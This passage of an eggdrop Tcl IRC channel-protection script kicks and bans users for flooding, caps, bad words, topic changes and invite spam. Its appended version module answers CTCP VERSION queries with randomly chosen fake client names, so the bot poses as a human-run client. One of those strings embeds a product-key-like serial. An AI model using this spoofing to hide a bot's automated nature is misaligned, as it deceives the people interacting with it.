    while {$cnt < $len} { if {[string index $text $cnt] == " " || [isupper [string index $text $cnt]]} { incr capcnt } ; incr cnt }
    if {[expr 100 * $capcnt / $len] >= [getuser $cflag XTRA "CAPS"]} {
      if {![info exists capsnick($nick)]} {
        putsrv "KICK $chan $nick :[lgrnd] 4!14alert4! 41st14 warn stop used 4capslock14 exceed4 [getuser $cflag XTRA "CAPS"]% [banmsg]"
        set capsnick($nick) "1"
        return 0
      }
      set bannick($nick) "$uhost"
      putsrv "KICK $chan $nick :[lgrnd] 4!14alert4! 42nd14 warn dønt used 4capslock14 exceed4 [getuser $cflag XTRA "CAPS"]% [banmsg]"
      unset capsnick($nick)
} } }
proc isupper {letter} { set caps {A B C D E F G H I J K L M N O P Q R S T U V W X Y Z} ; if {[lsearch -exact $caps $letter] > -1} { return 1 } else { return 0 } }
proc isflood {letter} { set caps {! @ # $ % ^ & * ( ) | [ ] < > / \ =    } ; if {[lsearch -exact $caps $letter] > -1} { return 1 } else { return 0 } }
proc isbad {nick uhost chan arg} {
  global badwords botnick notc bannick
  set arg [netext [string tolower $arg]]
  if {[string match "*-greet*" [channel info $chan]]} { set isbad 0 ; return 0 }
  foreach badword [string tolower $badwords] {
    if {([string match "$badword*" $arg] || [string match "*$badword *" $arg] || [string match "* $badword*" $arg]) && ![isop $nick $chan] && ![isvoice $nick $chan]} {   
      set bannick($nick) "$uhost"
      putserv "KICK $chan $nick :$notc 14badwo4rd14 match frøm 4$badword [banmsg]"
      return 1
    } }
  set isbad 0
  return 0
}
proc set_-m {chan} {
  if {[isutimer "set_-m $chan"]} { return 0 }
  if {[botonchan $chan] && [botisop $chan] && [string match "*m*" [getchanmode $chan]]} { putserv "mode $chan -m" }
}
bind topc - * topic_chk
proc topic_chk {nick uhost handle chan topic} {
  global botnick notc bannick
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![matchattr $cflag I]} { return 0 }
  if {$nick == $botnick || $nick == "ChanServ" || [matchattr $nick f]} { return 0 }
  if {[matchattr $nick m]} { setuser $cflag XTRA "TOPIC" [topic $chan] ; saveuser ; return 0 }
  if {![isop $botnick $chan]} { return 0 }
  if {$topic == [getuser $cflag XTRA "TOPIC"]} { return 0 }
  if {![string match "*dal.net*" $nick]} {
    set bannick($nick) "$uhost"
    putsrv "KICK $chan $nick :[lgrnd] 4!14alert4! 14dønt changing the 4topic [banmsg]"
  }
  puthlp "topic $chan :[getuser $cflag XTRA "TOPIC"]"
  return 0
}
bind flud - * flood_chk
proc flood_chk {nick host handle type channel} {
  global notc botnick quick bannick notm flooddeop floodnick floodkick igflood kops owner
  putlog "$notc FLOOD <<$type>> FRoM $host"
  if {[info exists bannick($nick)]} { return 1 }
  if {[info exists igflood($nick)]} { return 1 }
  if {[string match "*Serv*" $nick] || [matchattr $handle f] || $nick == $botnick} { putlog "$notc FlooD <<$nick>> Service OR FrIeNd !PaSS!" ; return 1 }
  if {[string index $channel 0] != "#"} { foreach x [channels] { if {[onchan $nick $x]} { set channel $x } } }
  set mhost "@[lindex [split $host @] 1]"
  if {[string index $channel 0] == "#"} { if {![isop $botnick $channel]} { putlog "$notc FlooD <<$nick>> BoT NoT $channel @P !IgNoREd!" ; return 1 } }
  set type [string tolower $type]
  if {$type == "join"} { set bannick($nick) "$mhost" ; putsrv "KICK $channel $nick :[lgrnd] 4!14alert4! 14exceed max 4join14 frøm 4$mhost [banmsg]" }
  if {$type == "ctcp"} {
    if {![info exists kops]} { if {[isop $nick $channel] || [isvoice $nick $channel]} { return 1 } }
    set bannick($nick) "$host"
    if {$quick == "1"} { putqck "KICK $channel $nick :$notm 4!14alert4! 14exceed max 4ctcp14 frøm 4$mhost [banmsg]" } else { putsrv "KICK $channel $nick :[lgrnd] 4!14alert4! 14exceed max 4ctcp14 frøm 4$mhost [banmsg]" }
  }
  if {$type == "pub"} {
    if {![info exists kops]} { if {[isop $nick $channel] || [isvoice $nick $channel]} { return 1 } }
    set bannick($nick) "$host"
    putsrv "KICK $channel $nick :[lgrnd] 4!14alert4! 14exceed max 4lines14 frøm 4$mhost [banmsg]"
    return 1
  }
  if {$type == "nick"} {
    if {![info exists kops]} { if {[isop $nick $channel] || [isvoice $nick $channel] || [string length $nick] == 8} { return 1 } }
    if {![info exists floodnick($mhost)]} {
      set floodnick($mhost) 1
      putsrv "KICK $channel $nick :[lgrnd] 4!14alert4! 14stop changing your 4nick [banmsg]"
      } {
      catch {unset floodnick($mhost)}
      set bannick($nick) "$host"
      putsrv "KICK $channel $nick :[lgrnd] 4!14alert4! 14twice exceed 4nick14 frøm 4$mhost [banmsg]"
    } }
  if {$type == "deop"} {
    if {![info exists flooddeop($nick)]} {
      set flooddeop($nick) 1
      putserv "KICK $channel $nick :$notc 4!14alert4! 14exceed max 4de@p14 frøm 4$mhost [banmsg]"
      } {
      catch {unset flooddeop($nick)}
      set bannick($nick) "$host"
      putserv "KICK $channel $nick :$notc 4!14alert4! 14twice exceed max 4de@p14 frøm 4$mhost [banmsg]"
    } }
  if {$type == "kick"} {
    if {![info exists floodkick($nick)]} {
      set floodkick($nick) 1
      putserv "KICK $channel $nick :$notc 4!14alert4! 14exceed max 4kick14 frøm 4$mhost [banmsg]"
      } {
      catch {unset floodkick($nick)}
      set bannick($nick) "$host"
      putserv "KICK $channel $nick :$notc 4!14alert4! 14twice exceed max 4kick14 frøm 4$mhost [banmsg]"
    } }
  return 1
}
bind raw - INVITE raw_chk
proc raw_chk {nick keyword arg} {
  global invme joinme notc bannick notd botnick
  set who [string range $nick 0 [expr [string first "!" $nick]-1]]
  set channel [lindex $arg 1]
  set channel [string range $channel 1 end]
  foreach x [channels] { if {[string tolower $channel] == [string tolower $x]} { putsrv "JOIN $channel" ; return 0 } }
  if {$who == "ChanServ" || [matchattr $who Z]} {
    if {![validchan $channel]} {
      if {[matchattr $who Z] && ![matchattr $who Q]} { puthlp "NOTICE $who :$notc 4DeNiEd..!" ; return 0 } else { set joinme $who }
      channel add $channel
      catch { channel set $channel -split +echox +trojan +dontkickops -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 4:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 3:10 flood-nick 3:30 }
      savechan
    }
    putsrv "JOIN $channel"
    return 0
  }
  if {[matchattr $who f]} { return 0 }
  foreach x [channels] {
    if {[onchan $who $x]} {
      if {[isop $botnick $x]} {
        set banmask "*[string range $who [string first "!" $who] end]"
        set bannick($who) $banmask
        putsrv "KICK $x $who :[lgrnd] 4!14spam4!14 i hate4 $channel 14inviter [banmsg]"
        } {
        putsrv "PRIVMSG $x :!inviter $who to 14[string trimleft $channel "#"]"
        foreach c [chanlist $x f] {
          if {[isop $c $x]} {
            set sendspam "!kick [zip "$x $who $notc 4!14spam4!14 frøm 4[string range $nick [string first "@" $nick] end]4 $channel 14inviter 4-repørt by14 $botnick-"]"
			putsrv "PRIVMSG $c :$sendspam" ; putlog "$notc RePORTED InVITING FRoM <<$who$x>> To #$c#"
      } } } } {
      set banmask "[string range $nick [string first "@" $nick] end]"
      	  if {$banmask != "*!*@*" && $banmask != "*"} {
        foreach c [chanlist $x] {
          set nickhost "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
          if {$banmask == $nickhost} {
            if {[matchattr $c f]} { continue }
            if {$c != $botnick} {
              if {[isop $botnick $x]} {
                set bannick($c) $banmask ; putsrv "KICK $x $c :[lgrnd] 4!14relay4!14 invite frøm 4$banmask 14to4 $channel [banmsg]"
                } { foreach s [chanlist $x f] { if {[isop $s $x]} { set sendspam "!kick [zip "$x $c $notc 4!14relay4!14 invite frøm 4$banmask 14to4 $channel 14-repørt by4 $botnick-"]" ; putsrv "PRIVMSG $s :$sendspam" } } } 
				} } } } } }
  set invme([string range $nick [string first "@" $nick] end]) "inviter" ; return 0
}
bind ctcp - CLIENTINFO sl_ctcp
bind ctcp - USERINFO sl_ctcp
bind ctcp - FINGER sl_ctcp
bind ctcp - ERRMSG sl_ctcp
bind ctcp - ECHO sl_ctcp
bind ctcp - INVITE sl_ctcp
bind ctcp - WHOAMI sl_ctcp
bind ctcp - OP sl_ctcp
bind ctcp - OPS sl_ctcp
bind ctcp - UNBAN sl_ctcp
bind ctcp - TIME sl_ctcp
#bind ctcp - VERSION sl_ctcp
bind ctcp - CHAT chat_ctcp
proc sl_ctcp {nick uhost hand dest key arg} {
  global botnick notc
  if {[matchattr $nick f] || $nick == $botnick} { return 1 }
  if {[string match "*dal*net*" [string tolower $uhost]]} { putsrv "NOTICE $nick :\001VERSION mIRC v6.2 Khaled Mardam-Bey\001" } { set hostmask "${nick}!*@*" ; newignore $hostmask $botnick "*" 1 }
  return 1
}
proc chat_ctcp {nick uhost hand dest key arg} {
  global botnick notc
  putlog "blug"
  if {[matchattr $nick Z]} { return 0 }
  putlog "$nick dcc"
  puthlp "NOTICE $nick :$notc 14SoRRY I DoNT KNoW YoU..!"
  newignore "${nick}!*@*" $botnick "*" 1 ; return 1
}
proc voiceq {chan nick} { utimer [expr 5 + [rand 15]] [list voiceprc $chan $nick] }
proc voiceprc {chan nick} { global botnick ; if {[isop $botnick $chan] && ![isvoice $nick $chan] && ![isop $nick $chan]} { putserv "MODE $chan +vvvvvv $nick" } }
proc advertise {chan nick} {
  if {[isutimer "advq $chan $nick"]} { return 0 }
  set cret 5
  foreach ct [utimers] { if {[string match "*advq*" $ct]} { if {[expr [lindex $ct 0] + 5] > $cret} { set cret [expr [lindex $ct 0] + 5] } } }
  utimer $cret [list advq $chan $nick]
}
proc advq {chan nick} {
  global notc
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {![isop $nick $chan] && [onchan $nick $chan]} {
    set greetmsg [getuser $cflag XTRA "GREET"] ; regsub %n $greetmsg $nick greetmsg
    regsub %c $greetmsg $chan greetmsg ; puthlp "PRIVMSG $nick :$notc $greetmsg"
  } }
proc deopprc {chan nick} { global botnick ; if {[isop $botnick $chan] && [isop $nick $chan]} { if {![string match "*k*" [getchanmode $chan]]} { putserv "MODE $chan -ko 14n4o.14g4uest.14@4ps $nick" } { putserv "MODE $chan -o $nick" } } }
proc autokick {chan nick} {
  global bannick notc botnick
  if {[isop $botnick $chan] && ![isop $nick $chan] && ![isvoice $nick $chan]} {
    set hostmask [getchanhost $nick $chan] ; set hostmask "*!*@[lindex [split $hostmask @] 1]"
    set bannick($nick) $hostmask ; putsrv "KICK $chan $nick :[lgrnd] 4!14alert4! 14channel is under construction [banmsg]"
  } }
proc opq {chan nick} { utimer [expr 7 + [rand 15]] [list opprc $chan $nick] }
proc opprc {chan nick} { global botnick unop ; if {[isop $botnick $chan] && ![isop $nick $chan] && ![info exists unop($nick)]} { putserv "MODE $chan +oooooo $nick" } }
bind raw - 301 rtn
proc rtn { from keyword arg } {
global notd botnick notb notc bannick
set nick [lindex $arg 1]
if {[matchattr $nick f]} { return 0 }
if {$nick == $botnick} { return 0 }
set awaytext [string range [lrange $arg 2 end] 1 end]
set awaytext [string tolower [netext $awaytext]]
if {[string match "*#*" $awaytext] || [string match "*/j*" $awaytext] || [string match "*www.*" $awaytext] || [string match "*http://*" $awaytext]} {
  foreach x [channels] { set chksiton [string tolower $x] ; if {[string match "*$chksiton*" [string tolower $awaytext]]} { return 0 } }
  foreach x [channels] {
    if {[onchan $nick $x]} {
      if {[isop $botnick $x]} {
        set bannick($nick) "*!*[string range [getchanhost $nick $x] [string first "!" [getchanhost $nick $x]] end]"
        putsrv "KICK $x $nick :[lgrnd] 4!14spam4!14 invite 4away 14msg [banmsg]"
        } { foreach c [chanlist $x f] { if {[isop $c $x]} { set sendspam "!kick [zip "$x $nick $notc 4!14spam4!14 invite 4away 14msg 4-repørt by14 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam" } } }
		} } } }
bind time -  "*0 * * * *" chk_five
bind time -  "*6 * * * *" chk_five
proc chk_five {min h d m y} { global longer ; catch { remain } ; puthlp "AWAY :$longer" ; auto_ping "0" "0" "0" "0" "0" }
proc pub_log {nick uhost hand channel arg} { global notc ; if {[getuser "config" XTRA "LOGCHAN"]!=""} { puthlp "NOTICE $nick :$notc Log [getuser "config" XTRA "LOGCHAN"]" } }
set nwo $owner
proc chk_limit {chan} {
  global notc botnick lst_limit
  if {![isop $botnick $chan]} { return 0 }
  if {![info exists lst_limit($chan)]} { set lst_limit($chan) 0 }
  set cflag "c$chan" ; set cflag [string range $cflag 0 8]
  set usercount 0 ; foreach x [chanlist $chan] { incr usercount }
  set usercount [expr [getuser $cflag XTRA "LIMIT"] + $usercount]
  if {$lst_limit($chan) != $usercount} { set lst_limit($chan) $usercount ; putserv "MODE $chan +l $usercount" }
}
set quick "0"
proc chk_quick {} { global quick botnick ; putquick "PRIVMSG $botnick :\001PING [unixtime]\001" ; set quick "1" }
utimer 1 chk_quick
bind raw - MODE chk_op
proc chk_op {from keyword arg} {
  global botnick
  if {![string match "*+o*$botnick" $arg]} { return 0 }
  set chan [lindex $arg 0]
  if {[string match "*dal.net*" $from] && [string match "ChanServ!*@*" $from]} {pub_resync $botnick "*" "*" $chan "*" ; return 0}
}
proc chk_on_op {channel} {
  global botnick kickme deopme invme virus_file virus_nick quick notc bannick is_m botname 
  set cflag "c$channel"
  set cflag [string range $cflag 0 8]
  if {[isutimer "chkspam $channel"]} { foreach x [utimers] { if {[string match "*chkspam $channel*" $x]} { killutimer [lindex $x 2] } } }
  if {[isutimer "GOP $channel"]} { return 0 }
  if {![onchan $botnick $channel]} { return 0 }
  utimer 20 [list putlog "GOP $channel"]
  set cinfo [channel info $channel]
  if {[string match "*+nodesynch*" $cinfo]} { pub_mdeop "*" "*" "*" $channel "" }
  set cmode [getchanmode $channel]
  if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
    if {[matchattr $cflag K]} {
      if {![string match "*[dezip [getuser $cflag XTRA "CI"]]*" [getchanmode $channel]]} { puthelp "mode $channel -k+k . [dezip [getuser $cflag XTRA "CI"]]" }
      } { if {[string match "*k*" $cmode]} { putserv "mode $channel -k 14r4.e.l.e.a.s.e.d" } }
    if {[string match "*R*" $cmode]} { puthelp "mode $channel -R" }
    if {[string match "*m*" $cmode] && ![string match "*m*" [lindex [channel info $channel] 0]]} { putserv "mode $channel -m" }
    if {[string match "*i*" $cmode]} { putserv "mode $channel -i" }
  }
  if {![string match "*m*" $cmode]} { foreach x [utimers] { if {[string match "*set_-m $channel*" $x]} { killutimer [lindex $x 2] } } }
  if {[matchattr $cflag I]} { if {[topic $channel] != [getuser $cflag XTRA "TOPIC"]} { puthlp "topic $channel :[getuser $cflag XTRA "TOPIC"]" } }
  foreach x [chanlist $channel] {
    if {$x == $deopme} {
      if {[isop $x $channel]} { if {![string match "*k*" $cmode]} { if {$quick == "1"} { putquick "mode $channel -ko 14d4e.@p.14r4everse $x" } else { putserv "mode $channel -ko 14d4e.14@4p.14r4everse $x" } } { if {$quick == "1"} { putquick "mode $channel -o $x" } else { putserv "mode $channel -o $x" } } }
      set deopme ""
    }
    set uhost "[getchanhost $x $channel]"
    set mhost "@[lindex [split [getchanhost $x $channel] @] 1]"
    if {[info exists kickme($x)]} {
      if {$kickme($x) == 3} {
        catch { unset kickme($x) }
        set bannick($x) "$uhost"
        if {$quick == "1"} { putqck "KICK $channel $x :$notc 4!14alert4! 14repeat 4kick 14remote off [banmsg]" } else { putsrv "KICK $channel $x :[lgrnd] 4!14alert4! 14repeat 4kick 14remote off [banmsg]" }
        } {
        if {$kickme($x) == 1} { if {$quick == "1"} { putqck "KICK $channel $x :$notc 4!14lamer4! 14self 4kick14 revenge [banmsg]" } { putsrv "KICK $channel $x :[lgrnd] 4!14lamer4! 14self 4kick14 revenge [banmsg]" } }
      } }
    if {[string match "*+trojan*" $cinfo]} { set bmask_check $x!$uhost ; set bmask_host "*!*@[lindex [split $mhost @] 1]" ; trojanchk $x $bmask_check $bmask_host $channel }
    if {[string match "*+echox*" $cinfo]} { echoxchk $x $uhost * $channel }
    if {[string match "*+greet*" $cinfo]} { badnick_chk $x $uhost * $channel }
    if {[matchattr $cflag V]} {
      if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
        if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
          set cret [getuser $cflag XTRA "VC"]
          foreach ct [utimers] { if {[string match "*voiceq*" $ct]} { if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} { set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] } } }
          utimer $cret [list voiceq $channel $x]
        } } }
    if {[matchattr $x v] || [matchattr $x P] || [matchattr $x G]} { if {![isop $x $channel] || ![isvoice $x $channel]} { whoisq $x } }
    if {[string match "*+unidentifyop*" [channel info $channel]]} { if {[isop $x $channel]} { whoisq $x } }
    if {[matchattr $x O]} {
      if {[isop $x $channel]} {
        if {![string match "*k*" $cmode]} { puthelp "mode $channel -ko 14n4o@p.14l4ist $x" } { puthelp "mode $channel -o $x" }
        } { if {[isvoice $x $channel]} { if {![string match "*k*" $cmode]} { puthelp "mode $channel -kv 14n4o@p.14l4ist $x" } { puthelp "mode $channel -v $x" } } }
		}
    if {[info exists invme($mhost)]} {
      putlog "exist invme $x $invme($mhost) $channel chk_on_op"
      if {![isop $x $channel]} {
        set bannick($x) "$mhost"
        if {$invme($mhost) == "autojoin msg"} {
          if {![isvoice $x $channel]} { putsrv "KICK $channel $x :[lgrnd] 4!14spam4!14 frøm 4$mhost 14$invme($mhost) 4r14emote 4o14ff [banmsg]" }
        } { putsrv "KICK $channel $x :[lgrnd] 4!14spam4!14 frøm 4$mhost 14$invme($mhost) [banmsg]" }
      }
      catch {unset invme($mhost)}
    } }
  foreach x [chanlist $channel K] { if {![matchattr $x f]} { akick_chk $x [getchanhost $x $channel] $channel } }
  foreach x [chanlist $channel D] { if {![matchattr $x f]} { dead_chk $x [getchanhost $x $channel] $channel } }
  foreach x [chanbans $channel] {
    set bhost [lindex $x 0]
    if {[string match [string tolower $bhost] [string tolower $botname]]} {
      if {![string match "*k*" $cmode]} { puthelp "mode $channel -kb 14s4elf.14u4nban $bhost" } { puthelp "mode $channel -b $bhost" }
      } elseif {[matchattr $bhost f]} { puthelp "mode $channel -kb 14a4uto.14u4nban $bhost"
      } elseif {[getuser "config" XTRA "IPG"] != ""} {
      foreach ipg [getuser "config" XTRA "IPG"] {
        if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
          if {![isutimer "IPG $bhost"]} {
            if {![string match "*k*" $cmode]} { puthelp "mode $channel -kb 14ip.gu4a14rd $bhost" } { puthelp "mode $channel -b $bhost" }
            utimer 60 [list putlog "IPG $bhost"]
} } } } } }
bind time -  "01 * * * *" chkonop
proc chkonop {min h d m y} { global botnick ; foreach x [channels] { if {[isop $botnick $x]} { chk_on_op $x } } }
bind time -  "09 09 * * *" show_status
proc show_status {min h d m y} { global botnick ; foreach x [channels] { if {[isop $botnick $x] && [string match "*+shared*" [channel info $x]]} { pub_status "*" "*" "*" $x "" } } }
proc badnick_chk {nick uhost hand chan} {
  global bannick notc botnick badwords
  foreach y [string tolower $badwords] {
    if {[string match "*$y*" [string tolower $nick]]} {
	foreach x [channels] {
        if {[onchan ${nick} $x]} {
          if {[botisop $x]} {
            set bannick($nick) "$uhost" ; putsrv "KICK $x ${nick} :[lgrnd] 14badni4ck14 match frøm 4$y [banmsg]"
            } else { foreach c [chanlist $x f] { if {[isop $c $x]} { set sendspam "!kick [zip "$x ${nick} $notc 14badni4ck14 match frøm 4$y 14-repørt by4 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam" } } } 
			} } } }
return 0
}
proc akick_chk {nick uhost chan} {
  global notc bannick ; foreach x [getuser "AKICK" HOSTS] {
    if {[string match [string tolower $x] [string tolower "$nick!$uhost"]]} {
      set bannick($nick) $uhost ; putsrv "KICK $chan $nick :[lgrnd] 14blackli4st14 [kickmsg] [banmsg]"
} } }
proc dead_chk {nick uhost chan} {
  global notc bannick ; foreach x [getuser "DEAD" HOSTS] {
    if {[string match [string tolower $x] [string tolower "$nick!$uhost"]]} {
      set bannick($nick) $uhost ; putsrv "KICK $chan $nick :[lgrnd] 14dead-e4nd4 [kickmsg] [banmsg]"
} } }
proc isutimer {text} { set text [string tolower $text] ; foreach x [utimers] { set x [string tolower $x] ; if {[string match "*$text*" $x]} { return 1 ; break } } ; return 0 }
proc istimer {text} { set text [string tolower $text] ; foreach x [timers] { set x [string tolower $x] ; if {[string match "*$text*" $x]} { return 1 ; break } } ; return 0 }
setudef flag idleop
setudef flag action
proc pub_+action {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :$notc 4DeNIEd..!"
      return 0
   }
   if {[string match "*+action*" [channel info $chan]]} {
      puthelp "NOTICE $nick :$notc $chan 4ReADY!!"
      return 0
   }  
   if {$rest == ""} {
      puthelp "NOTICE $nick :$notc AcTion Random \[9ON\]"
   } {
      setuser $cflag XTRA "ACTION" $rest
      puthelp "NOTICE $nick :$notc AcTion SeT TO \[$rest\]"
   }
   catch { channel set $chan +action }
   puthelp "NOTICE $nick :$notc AcTion $chan \[9ON\]"
   saveuser
}
proc pub_-action {nick uhost hand chan rest} {
   global notc 
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :$notc 4DeNIEd..!"
      return 0
   }
   if {[string match "*-action*" [channel info $chan]]} {
      puthelp "NOTICE $nick :$notc AcTion $chan already 4DISaBLE."
      return 0
   }
   catch { channel set $chan -action }
   setuser $cflag XTRA "ACTION" ""
   puthelp "NOTICE $nick :$notc AcTion $chan \[4Off\]"
   saveuser
}
set realnm {
"For Belajar Only" "Not For Commercial" "Free Monster Help"
"Friend Forever" "Long Way TO GO" "Knowledge is Free"
"Happy Days" "Best Days" "FIVA FOREVER"
}
proc realnames {} {
global realnm
set realnames  [lindex $realnm [rand [llength $realnm]]]
}
##guard.tcl
## versions.tcl
set rv_style "alw"
## What users can use rvstyle command?
set rv_flag "n"
### Flood Protection Settings ###
## [0/1] Do you want to enable the flood protection?
# Note: This only protects your bot from ctcp-finger flood.
set rv_fludprot 1
## Answer how many ctcp-fingers in how many seconds?
set rv_maxctcps 1:10
## [0/1] Do you want to ignore the flooder?
set rv_ignore 1
## How long do you want to ignore the flooder (min)?
set rv_ignoretime 1
## The users with one of the following flags shouldn't be ignored.
# Note: Leave this empty if you want to ignore everybody.
set rv_flags "f"
### Misc Things ###
set rv_ver "2.00"
set rv_maxctcps [split $rv_maxctcps :]
set rv_style [string tolower $rv_style]
## mIRC versions.
set rv_desc(mirc) "mIRC"
set rv_versions(mirc) { "mIRC v6.21 Khaled Mardam-Bey" "mIRC v6.20 Khaled Mardam-Bey" "mIRC v6.22 Khaled Mardam-Bey" }
## irssi versions.
set rv_desc(irssi) "irssi"
set rv_versions(irssi) { "irssi v0.8.10 - running on OpenBSD i386" }
## BitchX versions.
set rv_desc(bitchx) "BitchX"
set rv_versions(bitchx) { "BitchX-74p4+1.3g/Linux 2.0.35 :(c)rackrock/bX \[3.0.1?9\] : Keep it to yourself!" }
## random versions.
set rv_desc(alw) "alw"
set rv_versions(alw) {
  "BitchX-94p4+1.3g/Linux 2.6.35 :(C)rackrock/bX \[6.0.1?9\] : Keep it to yourself!"
  "mIRC v6.21 Khaled Mardam-Bey"
  "mrIRC v2.21 Khaled Mardam-Bey and F4R1S"
  "irssi v2.8.10 - running on OpenBSD i386"
  "PHPBoT Engine v1.0.2 (b)eta made by rhian : Slack Always Rocks!!"
  "BitchX-70alpha14+tcl by panasync - Linux 2.0.27  Keep it to yourself!"
  "BitchX-75p1+ by panasync - Linux 2.0.34 : Keep it to yourself!"
  "[bx.75p1] linux 2.0.36 [embryonic.22b3] :what is this that stands before me"
  "BitchX-74p2+1.3f/SunOS 5.6 :(c)rackrock/bX [3.0.1?8] : Keep it to yourself!"
  "BitchX-74p2+ by panasync - CYGWIN32/95 4.0 : Keep it to yourself!"
  "BitchX-75p3+/Linux 2.2.14 :(c)rackrock/crk [3.0.1?9]"
  "BitchX-74p4+ by panasync - Linux 2.0.35 : Keep it to yourself!"
  "BitchX-74p4+/FreeBSD 2.2.5-RELEASE"
  "ButchX-p6+ANSI-2a by conio - Windows 98 (XiRCON 1.0B4) : Keep it to yourself!"
  "Eggdrop 1.6.18i (c)2006 Robey Pointer"
  "eggdrop v1.6.18 Linux"
  "osiris-1c/bitchx-75p3 : Onoofius Frooboo"
  "Running KVirc 0.9.0 by Szymon 'Pragma@ircnet' Stefanek <kvirc@tin.it> No script"
  "PIRCH98:WIN 95/98/WIN NT:1.0 (build 1.0.1.1190)"
  "xc! 1.4.0 Linux 2.2.14 [i586/401MHz]: http://www.cueuc-kekc.org"
  "Little Star v6.1, written by Scoobster ?1997"
  "ircII 2.8.2 SunOS 5.6 :ircii 2.8: almost there..."
  "Amazon Irc (c) 1997 by 140Clark Savage Jr."
  "ircII EPIC4pre2 Linux 2.0.34 - Accept no limitations."
  ".(?argon/?1g)? :bitchx-75 : Keep it to yourself!"
  "ircII EPIC4pre2 SunOS 5.6 - c?ypher?(beta\?one) -?myd!?nas :?one step closer to world domination?"
  "ircII EPIC4pre2 Linux 2.0.34 - Accept no limitations."
  "ircII 2.9-BitchX-60 Linux 1.2.8 :bitZ%summer '96(bitX%summer'96)"
  "ircII EPIC4-2000 Linux 2.2.9 - LiCe v4.1.9"
  "ircII 2.8.2^hADES%fINAL+CAVLINK by hellshock"
  "ircII 2.8.2 + ScrollZ v1.8d (12.2.97) by Flier + Cdcc v1.5 - Accept no limits!"
  "[?AtlantiS(v1.2a)] by Dethnite"
  "Quarterdeck Global Chat 1.2.9 for Macintosh"
  "Client [19950405]  Script crimson.caverns[ build 008 ][\" WordG \"] "
  "Netscape 3.0 (WWW IRC; Now were talking!)"
  "WSIRC 2.03-R - CopyRight 1994, 1995  Caesar M Samsi _@cueuc-kekc.org TEXT CHANNEL"
  "ircII 2.9-BitchX-60 Linux 1.2.8 :bitZ%summer '96(bitX%summer'96)"
  "xircon[b4] + doot.3b[pawt] be-two + anony(v1) + aolsay(impulse) + deepthought + saq(dbg)"
  "ircII 4.4A+ScrollZ v1.8i1 (25.06.98)+Cdcc v1.6 - styx/SZ 4.0 beta 2"
  "ircII 2.9_base OSF1 V4.0 :ircii 2.8: almost there..."
  "ircN 6.03 for mIRC - lost my innocence to a no good girl -"
  "osiri?s-1c/?bitch?x-75p1 +? a?utob?ot(?bx)? p3x3 : that time then and once again.."
  "WinIRC CE (beta version code046532) - palmtop PC's IRC addon (Windows CE) - Microsoft'99"
  "NokiaIRC (mobile phone [8110] addon) - v3523 serial 543.32 - Nokia, around the world"
  "IRC-Playstation client version 0.1.2313e - Copyright Sony 1999"
  "SegaIRC v1.0.3release / MegaDrive16 version (340575) / (Copyright Sega'99 - all rights reserved)"
  "AmIRC/AmigaOS 2.0.4 by Oliver Wagner <_@cueuc-kekc.org> : http://www.cueuc-kekc.org/ : [#0000D63F] : The slow mess client"
  "Ircle 3.0b10 US PPC 12/15/1997 21:07:34 PM. #239C23AF21B"
  "Running Visual IRC '97 1.00. Get your copy today!! http://www.cueuc-kekc.org"
  "Klient 1.0 beta 14"
  "telnet client for Mac beta version code 046532"
  "FUcking mIRC by K.Madan.Bay or somthing like that v.2.35.7"
  "Windows 2000 CE IRClient v.1.2.f Beta.2.4 serial W7YY7-XWYDW-YVMQH-3VBHQ-MP7CQ"
  "WAB NokiaIRC (mobile phone [8110] addon) Nokia, around the world"
}
### Bindings ###
bind ctcp - VERSION ctcp:rv_version
bind dcc $rv_flag rvstyle dcc:rv_rvstyle
### Procs ###
proc dcc:rv_rvstyle {hand idx arg} {
  global rv_style rv_desc rv_versions
  set style [lindex [split $arg] 0]
  putcmdlog "#$hand# rvstyle $arg"
  if { $style == "" } {
    putidx $idx "Currently using: $rv_desc($rv_style) versions"
    putidx $idx "To get help, type: rvstyle -help"
    } elseif { [string tolower $style] == "-help" } {
    putidx $idx "NAME     DESCRIPTION" ; putidx $idx "-------  ----------------"
    foreach name [array names rv_versions] { putidx $idx "[format "%-8s %s" $name "$rv_desc($name) versions"]" }
    putidx $idx "To change the version-reply list, type: rvstyle <name>"
    } elseif { [lsearch -exact [array names rv_versions] [string tolower $style]] == -1 } { putidx $idx "Version-reply list '$style' is invalid."
    } else { set rv_style [string tolower $style] ; putidx $idx "Version-reply list changed to: $rv_desc($rv_style) versions" } 
}
proc ctcp:rv_version {nick uhost hand dest key arg} {
  global rv_versions rv_style rv_fludprot rv_maxctcps rv_ignore rv_ignoretime rv_flags rv_flooded rv_ctcpcount botnick
  set hostmask "*!*[string range $uhost [string first "@" $uhost] end]"
  if {$rv_fludprot} {
    if {![info exists rv_ctcpcount]} { set rv_ctcpcount 0 }
    if {![info exists rv_flooded]} { set rv_flooded 0 }
    if {$rv_flooded} { return 1 }
    incr rv_ctcpcount
    utimer [lindex $rv_maxctcps 1] "incr rv_ctcpcount -1"
    if {$rv_ctcpcount > [lindex $rv_maxctcps 0]} {
      utimer [lindex $rv_maxctcps 1] "set rv_flooded 0"
      set rv_flooded 1
      putlog "randversion: Blocking ctcp-versions for [lindex $rv_maxctcps 1] seconds." 
      if {$rv_ignore} { 
        foreach flag $rv_flags { if {[matchattr $hand $flag]} { return 1 } }
        if {![isignore $hostmask]} { newignore $hostmask $botnick "ctcp-version flood" $rv_ignoretime ; putlog "randversion: Ignoring $hostmask for ctcp-version flood for $rv_ignoretime mins." }
		}
      return 1
    } }
